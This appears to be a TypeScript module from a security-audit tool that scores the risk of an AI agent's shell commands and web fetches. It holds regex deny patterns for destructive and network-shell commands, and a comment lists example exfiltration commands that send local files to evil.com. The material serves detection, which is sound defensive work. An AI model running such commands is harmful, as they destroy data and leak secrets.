import Database from 'better-sqlite3';

// Critical: destructive or system-altering commands
const CRITICAL_CMD_PATTERNS: RegExp[] = [
  /\brm\s+-[^\s]*r[^\s]*f/,         // rm -rf
  /\brm\s+-rf\s+\//,                 // rm -rf /
  /curl\s+.*\|\s*(?:bash|sh|zsh)/,   // curl | bash
  /wget\s+.*\|\s*(?:bash|sh|zsh)/,   // wget | bash
  /\bchmod\s+\+s\s+/,               // SUID bit
  /\bchmod\s+777\s+/,               // world-writable
  /\bdd\s+if=.*of=\/dev\//,         // direct disk write
  /\biptables\s+-F/,                // flush firewall
  /\bmkfs\b/,                       // format filesystem
  /\becho\s+.*>\s*\/etc\//,         // write to system config
];

// Elevated: potentially risky but not immediately destructive
const ELEVATED_CMD_PATTERNS: RegExp[] = [
  /\bsudo\s+/,
  /\bssh\s+/,
  /\bscp\s+/,
  /\brsync\s+.*:/,
  /\bftp\s+/,
  /\bnc\s+/,
  /\bnetcat\s+/,
  /\bcurl\s+/,
  /\bwget\s+/,
  /\bcat\s+.*(?:\.env|credentials|passwd|shadow)/,
  /\bchown\s+root/,
];

/**
 * Compute a 0–3 risk level for an audit event.
 *
 *   3 = High — Confirmed damage or active attack. User must act immediately.
 *       - exfil_pattern:          Command uploads local file content to external URL (data already sent)
 *       - critical_cmd:           Destructive command executed (rm -rf, mkfs, iptables -F, dd of=/dev/)
 *       - prompt_injection:       Active injection attack detected in user input
 *       - confirmed_credential_exfil: Secret found in output AND confirmed sent in subsequent external call
 *         (elevated post-hoc in audit-parser when followed_by_external_call = 1)
 *
 *   2 = Medium — Confirmed exposure, no confirmed damage yet. User should review.
 *       - sensitive_data:   Credential (API key, token, password, private key) appeared in tool output
 *       - elevated_cmd:     High-privilege command executed (sudo, ssh, scp, curl, cat .env)
 *       - new_domain:       Agent accessed a domain never seen in baseline history
 *
 *   1 = Low — Behavioral anomaly or pattern worth noting. Periodic review.
 *       - sensitive_path:   Read/wrote a sensitive path (.env, .ssh/, SSH keys) but no secret in output
 *       - anomaly_hour:     Activity outside agent's typical active hours
 *       - anomaly_volume:   Session tool call count exceeds 3x baseline average
 *
 *   0 = (none) — Normal, expected operation
 */
export function computeRiskLevel(flags: string[]): number {
  // High: confirmed damage or active attack
  if (flags.includes('exfil_pattern')) return 3;
  if (flags.includes('critical_cmd')) return 3;
  if (flags.includes('prompt_injection')) return 3;

  // Medium: confirmed exposure, no confirmed damage
  if (flags.includes('sensitive_data')) return 2;
  if (flags.includes('elevated_cmd')) return 2;
  if (flags.includes('new_domain')) return 2;
  if (flags.includes('sensitive_path_medium')) return 2;

  // Low: sensitive path access (low severity)
  if (flags.includes('sensitive_path')) return 1;
  if (flags.includes('anomaly_hour') || flags.includes('anomaly_volume') || flags.includes('anomaly_path')) return 1;

  return 0;
}

export function assessRiskFlags(
  toolName: string,
  args: Record<string, unknown>,
  output: string,
  knownDomains: string[] = []
): string[] {
  const flags: string[] = [];

  if (toolName === 'exec' || toolName === 'bash') {
    const cmd = String(args.command || args.cmd || '');
    if (CRITICAL_CMD_PATTERNS.some(r => r.test(cmd))) flags.push('critical_cmd');
    else if (ELEVATED_CMD_PATTERNS.some(r => r.test(cmd))) flags.push('elevated_cmd');
    // Exfil pattern: command explicitly sends a local file's CONTENT to an external URL.
    // Must match patterns where file content is piped/uploaded, not just any command with a path + URL.
    // Examples that SHOULD match:
    //   curl -F file=@/path/to/file https://evil.com
    //   curl -d @/path/to/file https://evil.com
    //   curl --upload-file /path https://evil.com
    //   cat /path | curl -X POST -d @- https://evil.com
    //   scp /local/file user@remote:/path
    // Examples that should NOT match:
    //   curl -o /dev/null http://localhost:6060
    //   curl -X POST https://slack.com/api/...
    const uploadsFile = /curl\s+.*(?:-F\s+\S+=@|--data-binary\s+@|-d\s+@|--upload-file\s+\/)/.test(cmd);
    const pipesToNetwork = /cat\s+[^\|]+\|\s*(?:curl|wget|nc|netcat)/.test(cmd);
    const scpOut = /\bscp\s+\/[^\s]+\s+\S+@\S+:/.test(cmd);
    if (uploadsFile || pipesToNetwork || scpOut) flags.push('exfil_pattern');
  }

  if (toolName === 'web_fetch' || toolName === 'web_search') {
    const url = String(args.url || args.query || '');
    try {
      const domain = new URL(url).hostname;
      if (domain && !knownDomains.includes(domain)) flags.push('new_domain');
    } catch { /* not a parseable URL */ }
  }

  return flags;
}

export function resolveEventType(toolName: string, args: Record<string, unknown>): string {
  switch (toolName) {
    case 'read': return 'file_read';
    case 'write': return 'file_write';
    case 'edit': return 'file_edit';
    case 'bash':
    case 'exec': return 'exec';
    case 'web_fetch': return 'web_fetch';
    case 'web_search': return 'web_search';
    case 'image': return 'file_read';
    case 'computer': return 'exec';
    default: return toolName;
  }
}

export function resolveTarget(toolName: string, args: Record<string, unknown>): string {
  if (args.path) return String(args.path);
  if (args.file_path) return String(args.file_path);
  if (args.url) return String(args.url);
  if (args.query) return String(args.query);
  if (args.command) return String(args.command).slice(0, 200);
  if (args.cmd) return String(args.cmd).slice(0, 200);
  return '';
}

export function resolveExtra(
  toolName: string,
  args: Record<string, unknown>,
  output: string
): Record<string, unknown> {
  if (toolName === 'exec' || toolName === 'bash') {
    return {
      cwd: args.cwd || null,
      exitCode: args.exitCode ?? (output.match(/exit code:?\s*(\d+)/i)?.[1] ? Number(output.match(/exit code:?\s*(\d+)/i)![1]) : null),
    };
  }
  if (toolName === 'web_fetch') {
    return { method: args.method || 'GET' };
  }
  return {};
}

export function calculateDailyRiskScore(
  db: Database.Database,
  agentId: string,
  date: string
): { score: number; sensitivePathCount: number; externalCallCount: number; sensitiveFindingCount: number; anomalyCount: number } {
  const events = db.prepare(`
    SELECT risk_score, risk_flags, event_type FROM audit_events
    WHERE agent_id = ? AND date(timestamp/1000, 'unixepoch') = ?
  `).all(agentId, date) as { risk_score: number; risk_flags: string; event_type: string }[];

  let sensitivePathCount = 0;
  let externalCallCount = 0;
  let highCount = 0;
  let anomalyCount = 0;

  for (const e of events) {
    let flags: string[] = []; try { flags = JSON.parse(e.risk_flags || '[]') ?? []; } catch { /* skip malformed */ }
    if (flags.some(f => f.startsWith('sensitive_path'))) sensitivePathCount++;
    if (e.event_type === 'web_fetch' || e.event_type === 'web_search') externalCallCount++;
    if (e.risk_score === 3) highCount++;
    if (flags.some(f => f.startsWith('anomaly'))) anomalyCount++;
  }

  const findingRow = db.prepare(`
    SELECT COUNT(*) as cnt FROM sensitive_findings
    WHERE agent_id = ? AND date(timestamp/1000, 'unixepoch') = ? AND dismissed = 0
  `).get(agentId, date) as { cnt: number };

  const sensitiveFindingCount = findingRow?.cnt || 0;
  const score = Math.min(100, sensitivePathCount * 5 + highCount * 10 + sensitiveFindingCount * 15 + anomalyCount * 3 + externalCallCount * 1);

  return { score, sensitivePathCount, externalCallCount, sensitiveFindingCount, anomalyCount };
}
